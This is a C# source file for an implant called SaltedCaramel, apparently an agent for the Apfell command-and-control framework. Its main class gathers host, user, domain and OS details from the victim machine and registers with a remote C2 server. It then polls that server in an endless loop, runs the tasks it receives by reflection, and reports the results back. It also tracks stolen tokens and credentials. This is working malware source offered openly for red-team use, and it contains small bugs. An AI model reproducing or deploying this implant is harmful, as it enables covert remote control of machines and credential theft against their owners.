using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Linq;
using Apfell.Structs;
using Apfell.C2Profiles;
using SaltedCaramel.Tasks;
using SaltedCaramel.Jobs;

namespace SaltedCaramel
{

    /// <summary>
    /// This class contains all methods used by the CaramelImplant
    /// </summary>
    public class SCImplant
    {
        private const int MAX_RETRIES = 20;
        public string CallbackID;
        
        public List<Job> JobList;
        public string Host;
        public string IP;
        public int PID;
        public int SleepInterval;
        public string UserName;
        public string UUID = "UUID";
        public string DomainName;
        public string OS;
        public string Architecture;

        public C2Profile Profile;


        // serverEndpoint really should be a C2Profile class instance.
        public SCImplant(C2Profile profileInstance, int sleepTime=5000)
        {
            Profile = profileInstance;
            IP = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            Host = Dns.GetHostName();
            DomainName = Environment.UserDomainName;
            PID = Process.GetCurrentProcess().Id;
            OS = Environment.OSVersion.VersionString;
            if (IntPtr.Size == 8)
                Architecture = "x64";
            else
                Architecture = "x86";
            SleepInterval = sleepTime;
            UserName = Environment.UserName;
            //Endpoint = serverEndpoint;
            JobList = new List<Job>();
        }


        /// <summary>
        /// Send initial implant callback, different from normal task response
        /// because we need to get the implant ID from Apfell server
        /// </summary>
        public bool InitializeImplant()
        {
            int retryCount = 0;
            // If we didn't get success, retry and increment counter
            while (retryCount < MAX_RETRIES)
            {
                try
                {
                    string callbackID = Profile.RegisterAgent(this);
                    CallbackID = callbackID;
                    retryCount = 0;
                    return true;
                } catch (Exception ex)
                {
                    retryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            return false;
        }

        public void Start()
        {
            if (InitializeImplant())
            {
                while (true)
                {
                    SCTask task = CheckTasking();
                    if (task.command != "none" && SCTask.TaskMap.ContainsKey(task.command))
                    {
                        Job j = new Job(task, this);
                        j.Start();

                        if (task.command != "jobs" || task.command != "jobkill") // We don't want to add our job tracking jobs.
                        {
                            JobList.Add(j);
                        }
                    }
                    Thread.Sleep(SleepInterval);
                }
            }
        }

        public void DispatchJob(Job job)
        {
            // using System.Reflection;
            // Type thisType = this.GetType();
            // MethodInfo theMethod = thisType.GetMethod(TheCommandString);
            // theMethod.Invoke(this, userParameters);
            string cmd;
            if (SCTask.TaskMap.TryGetValue(job.Task.command, out cmd))
            {
                object[] args = { job.Task, this };
                var type = Type.GetType(String.Format("SaltedCaramel.Tasks.{}", cmd));
                type.GetMethod("Execute").Invoke(this, args);
            }

            SendResult(job);
        }

        public void SendResult(Job job)
        {
            int retryCount = 0;
            string result;
            if (job.Task.status == "complete" &&
                job.Task.command != "download" &&
                job.Task.command != "screencapture")
            {
                result = Profile.PostResponse(new SCTaskResp(job.Task.id, job.Task.message));
                while (!result.Contains("success") && retryCount < MAX_RETRIES)
                {
                    result = Profile.PostResponse(new SCTaskResp(job.Task.id, job.Task.message));
                    retryCount++;
                }
                retryCount = 0;
                result = Profile.SendComplete(job.Task.id);
                while (!result.Contains("success") && retryCount < MAX_RETRIES)
                {
                    result = Profile.SendComplete(job.Task.id);
                    retryCount++;
                }
            }
            else if (job.Task.status == "error")
            {
                result = Profile.SendError(job.Task.id, job.Task.message);
                while (!result.Contains("success") && retryCount < MAX_RETRIES)
                {
                    result = Profile.SendComplete(job.Task.id);
                    retryCount++;
                }
                retryCount = 0;
            }

            try
            {
                for (int i = 0; i < JobList.Count; ++i)
                {
                    if (JobList[i].JobID == job.JobID)
                    {
                        JobList.RemoveAt(i);
                    }
                }

            }
            catch (Exception e)
            {
                // This should only happen when testing.
                Debug.WriteLine($"[!] Caught exception: {e.Message}");
            }
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        public SCTask CheckTasking()
        {
            int retryCount = 0;
            SCTask task = null;
            while (retryCount < MAX_RETRIES)
            {
                try
                {
                    task = Profile.CheckTasking(this);
                    break;

                } catch (Exception ex)
                {
                    retryCount++;
                    Thread.Sleep(SleepInterval);
                }
            }
            return task;
        }

        /// <summary>
        /// Check if the implant has an alternate token
        /// </summary>
        /// <returns>True if the implant has an alternate token, false if not</returns>
        public bool HasAlternateToken()
        {
            if (Tasks.Token.stolenHandle != IntPtr.Zero)
                return true;
            else return false;
        }

        public bool HasCredentials()
        {
            if (Tasks.Token.Cred.User != null)
                return true;
            else return false;
        }
    }
}
